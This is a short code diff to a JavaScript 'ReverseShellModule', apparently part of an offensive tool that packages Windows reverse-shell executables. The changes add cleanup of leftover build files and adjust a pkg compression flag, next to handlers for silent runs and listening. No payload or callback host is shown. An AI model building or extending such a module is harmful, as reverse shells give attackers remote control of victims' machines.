@@ -126,7 +126,6 @@ export default class ReverseShellModule extends Module {
         this.waitRun = Number(sec)
     }
 
-
     handleSetSilent(value) {
         if(['true', 'false'].includes(value.toLowerCase()))
         this.runSilent = value.toLowerCase()
@@ -219,6 +218,11 @@ export default class ReverseShellModule extends Module {
                 mask: "MANIFEST",
             });
         }
+
+        // remove leftovers
+        console.log('[log] - Cleaning temp files...');
+        fs.unlink(__dirname + '/win-proj/winResource.exe', () => { });
+        fs.unlink(__dirname + '/win-proj/index.js', () => { });
     }
 
     async handleListen() {
@@ -271,7 +275,7 @@ export default class ReverseShellModule extends Module {
     }
 
     executePkg(jsPath, exeName){
-        try { execSync(`PKG_CACHE_PATH=${cachePath} pkg ${jsPath} --target win --compress GZip --output ${exeName}`, 
+        try { execSync(`PKG_CACHE_PATH=${cachePath} pkg ${jsPath} --target win -C GZip --output ${exeName}`, 
         {stdio : 'pipe' }) } catch { }
     }
 
